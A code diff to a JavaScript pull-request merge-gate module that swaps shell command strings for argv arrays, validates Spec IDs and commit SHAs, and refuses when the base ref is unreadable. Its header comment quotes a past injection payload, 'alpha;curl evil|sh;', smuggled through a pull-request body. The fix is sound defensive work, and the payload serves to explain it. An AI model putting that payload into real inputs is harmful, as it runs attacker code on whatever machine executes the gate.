@@ -3,16 +3,26 @@
  *
  * `pr-gates.mjs` is deliberately free of I/O — it only decides — so every fact
  * the criteria rules need is collected here and handed in. Dependencies arrive
- * through a `deps` object exposing `sh`, the same injection shape
- * `criteria/preconditions.mjs` and `local-attest-runner.mjs` use, so the whole
- * gather can be exercised without a repository, a network, or a `gh` token.
+ * through a `deps` object exposing `run`, the same injection shape
+ * `criteria/preconditions.mjs` uses, so the whole gather can be exercised
+ * without a repository, a network, or a `gh` token.
  *
- * The ref split is the security property (KD-14, REL-16): specs and the
- * criteria configuration for the RULES come from the base ref, while the
- * evidence and the check run come from the head. A pull request must not be
- * able to relax the rules that judge it by editing them in its own branch.
+ * `run` takes an ARGV ARRAY and must not use a shell. Every value below is
+ * attacker-reachable: the Spec IDs come straight out of the pull-request body.
+ * An earlier revision built shell strings here, and a body whose `## Spec ID`
+ * section read `alpha;curl evil|sh;` executed on the machine of whoever ran
+ * the merge gate. Argv arrays remove the class; SPEC_ID_RE below removes the
+ * path traversal that quoting alone would have left behind.
+ *
+ * The ref split is the security property (KD-14, REL-16). The criteria
+ * CONFIGURATION comes from the base ref, so a pull request cannot relax the
+ * gate that judges it by editing `.dotbabel.json` in its own branch. Specs are
+ * read at BOTH refs for different questions: the head says what must be proven
+ * now, and the base says what was active before, so dropping a criterion is
+ * visible as weakening rather than as an absence. Evidence and the check run
+ * come from the head.
  */
-import { parseSpecIds } from "../lib/spec-ids.mjs";
+import { parseSpecIds, stripFences } from "../lib/spec-ids.mjs";
 import { loadCriteriaConfigText } from "./config.mjs";
 
 /** The check-run name KD-10 gives the criteria job in the CI templates. */
@@ -22,7 +32,8 @@ export const CRITERIA_CHECK_NAME = "dotbabel criteria";
 const COMMENT_PAGE_SIZE = 100;
 const MAX_COMMENT_PAGES = 100;
 
-const RE_CRITERIA_RATIONALE = /^ {0,3}##[ \t]+Criteria change rationale[ \t]*$/im;
+// The section runs from its own heading to the next H2 or the end of the body.
+const RE_CRITERIA_RATIONALE = /^ {0,3}##[ \t]+Criteria change rationale[ \t]*$([\s\S]*?)(?=^ {0,3}##[ \t]|$(?![\s\S]))/im;
 
 const COMMENTS_QUERY = [
   "query($owner:String!,$repo:String!,$number:Int!,$cursor:String){",
@@ -34,24 +45,21 @@ const COMMENTS_QUERY = [
 ].join("");
 
 /**
- * @typedef {{sh: (cmd: string) => {status: number, stdout: string, stderr: string}}} GateDeps
+ * @typedef {{run: (argv: string[]) => {status: number, stdout: string, stderr: string}}} GateDeps
  */
 
 /**
- * Quote a value for a `shell: true` command line.
+ * A Spec ID that is safe to use as a path segment: a plain directory name.
  *
- * Single quotes, not `JSON.stringify`: a GraphQL query is full of `$owner`,
- * `$repo` and `$cursor` variable sigils, and inside double quotes the shell
- * expands every one of them to the empty string. The query then reaches the
- * API malformed and the whole comment fetch fails — which the merge gate
- * correctly, and confusingly, reports as unreadable evidence.
- *
- * @param {string} value
- * @returns {string}
+ * Spec IDs come from the pull-request body, which anyone who can open a pull
+ * request controls, and `parseSpecIdSection` deliberately does not sanitize
+ * them — containment is the caller's job. This is that job. Rejecting here
+ * also closes the `../../` traversal the same token permits.
  */
-function shQuote(value) {
-  return `'${String(value).replaceAll("'", `'\\''`)}'`;
-}
+const SPEC_ID_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;
+
+/** A full commit object id, the only shape `gh` ever returns for a ref oid. */
+const SHA_RE = /^[0-9a-f]{40}$/i;
 
 /**
  * Build the criteria half of the merge-gate input.
@@ -69,11 +77,34 @@ function shQuote(value) {
 export function criteriaGateInputs(deps, view, prNumber) {
   const headSha = String(view?.headRefOid ?? "");
   const baseSha = String(view?.baseRefOid ?? "");
-  if (headSha === "" || baseSha === "") return {};
+  // Shape-check rather than merely non-empty: these reach argv positions, and
+  // a value that is not a commit id is a caller bug, not a pull request the
+  // gate should try to judge.
+  if (!SHA_RE.test(headSha) || !SHA_RE.test(baseSha)) return {};
 
   const body = String(view?.body ?? "");
   const specIds = parseSpecIds(body);
   if (specIds.length === 0) return {};
+
+  // Every base-ref read below answers "not there" the same way it answers
+  // "could not read", and the two must not be confused. A base commit this
+  // clone never fetched — a shallow CI checkout, a stale worktree — would
+  // otherwise quietly empty baseActiveCriteria (so removing a criterion stops
+  // reading as weakening) and drop the configuration back to defaults (so a
+  // repository's require_ci_check: true becomes false). Both are fail-open,
+  // which REL-3 forbids. Probe once and refuse instead.
+  if (!refIsReadable(deps, baseSha)) {
+    return {
+      headRefOid: headSha,
+      requiredCriteria: {},
+      baseActiveCriteria: {},
+      unknownSpecIds: [],
+      criteriaChangeRationale: false,
+      criteriaBaseUnreadable: baseSha,
+      comments: [],
+      ciCriteriaCheck: null,
+    };
+  }
 
   /** @type {Record<string, string[]>} */
   const requiredCriteria = {};
@@ -82,6 +113,14 @@ export function criteriaGateInputs(deps, view, prNumber) {
   const unknownSpecIds = [];
 
   for (const id of specIds) {
+    // Never let an unvalidated id reach a command. An id that is not a plain
+    // directory name names no spec, so it belongs in unknownSpecIds — which
+    // blocks the merge — rather than in a `git show` argument.
+    if (!SPEC_ID_RE.test(id)) {
+      unknownSpecIds.push(id);
+      continue;
+    }
+
     const head = activeCriteriaAt(deps, headSha, id);
     if (head === null) unknownSpecIds.push(id);
     else requiredCriteria[id] = head;
@@ -96,13 +135,47 @@ export function criteriaGateInputs(deps, view, prNumber) {
     requiredCriteria,
     baseActiveCriteria,
     unknownSpecIds,
-    criteriaChangeRationale: RE_CRITERIA_RATIONALE.test(body),
+    criteriaChangeRationale: hasCriteriaChangeRationale(body),
     criteriaEnforcement: config.enforcement,
     trustedAssociations: config.trusted_associations,
     requireCiCheck: config.require_ci_check,
     comments: prComments(deps, prNumber),
     ciCriteriaCheck: config.require_ci_check ? criteriaCheckConclusion(deps, headSha) : null,
   };
+}
+
+/**
+ * True when a commit object is present in this clone.
+ *
+ * `git cat-file -e <sha>^{commit}` is the cheap existence probe: it resolves
+ * the object and exits non-zero when it is absent, without materialising a
+ * tree.
+ *
+ * @param {GateDeps} deps
+ * @param {string} sha
+ * @returns {boolean}
+ */
+function refIsReadable(deps, sha) {
+  return deps.run(["git", "cat-file", "-e", `${sha}^{commit}`]).status === 0;
+}
+
+/**
+ * True when the body carries a `## Criteria change rationale` section WITH
+ * CONTENT, as §5 specifies.
+ *
+ * Two details carry weight, because this flag downgrades `CRITERIA_WEAKENED`
+ * from a blocker to a warning (REL-15) and the author writes it themselves.
+ * Fences are stripped first, so a heading quoted in a documentation snippet
+ * does not arm the downgrade, matching every other H2 rule in the gate. And
+ * the section must actually say something — a bare heading is not a reviewed
+ * decision, it is two words of self-service text.
+ *
+ * @param {string} body
+ * @returns {boolean}
+ */
+function hasCriteriaChangeRationale(body) {
+  const m = RE_CRITERIA_RATIONALE.exec(stripFences(body));
+  return m !== null && m[1].replace(/<!--[\s\S]*?-->/g, "").trim() !== "";
 }
 
 /**
@@ -118,7 +191,7 @@ export function criteriaGateInputs(deps, view, prNumber) {
  * @returns {string[]|null}
  */
 function activeCriteriaAt(deps, sha, specId) {
-  const r = deps.sh(`git show ${sha}:docs/specs/${specId}/spec.json`);
+  const r = deps.run(["git", "show", `${sha}:docs/specs/${specId}/spec.json`]);
   if (r.status !== 0) return null;
   try {
     const spec = JSON.parse(r.stdout);
@@ -141,7 +214,7 @@ function activeCriteriaAt(deps, sha, specId) {
  * @returns {ReturnType<typeof loadCriteriaConfigText>}
  */
 function criteriaConfigAt(deps, sha) {
-  const r = deps.sh(`git show ${sha}:.dotbabel.json`);
+  const r = deps.run(["git", "show", `${sha}:.dotbabel.json`]);
   return loadCriteriaConfigText(r.status === 0 ? r.stdout : null, `${sha}:.dotbabel.json`);
 }
 
@@ -167,11 +240,12 @@ function prComments(deps, prNumber) {
   for (let page = 0; page < MAX_COMMENT_PAGES; page += 1) {
     // `-F` for owner/repo because only that flag expands the {owner}/{repo}
     // placeholders; `-f` for the cursor so an all-digit cursor is not coerced
-    // into a number.
-    const cursorArg = cursor === null ? "" : ` -f cursor=${shQuote(cursor)}`;
-    const r = deps.sh(
-      `gh api graphql -F owner={owner} -F repo={repo} -F number=${prNumber}${cursorArg} -f query=${shQuote(COMMENTS_QUERY)}`,
-    );
+    // into a number. As argv entries no shell sees these, so the query keeps
+    // its `$owner`/`$cursor` sigils without any quoting.
+    const argv = ["gh", "api", "graphql", "-F", "owner={owner}", "-F", "repo={repo}", "-F", `number=${prNumber}`];
+    if (cursor !== null) argv.push("-f", `cursor=${cursor}`);
+    argv.push("-f", `query=${COMMENTS_QUERY}`);
+    const r = deps.run(argv);
     if (r.status !== 0) return null;
 
     let data;
@@ -216,7 +290,7 @@ function criteriaCheckConclusion(deps, headSha) {
   // No `--paginate`: this endpoint returns an object, and gh concatenates one
   // JSON object per page, which JSON.parse rejects — the whole lookup would
   // then always answer null. `per_page=100` covers any realistic check matrix.
-  const r = deps.sh(`gh api "repos/{owner}/{repo}/commits/${headSha}/check-runs?per_page=100"`);
+  const r = deps.run(["gh", "api", `repos/{owner}/{repo}/commits/${headSha}/check-runs?per_page=100`]);
   if (r.status !== 0) return null;
   try {
     const runs = JSON.parse(r.stdout).check_runs ?? [];
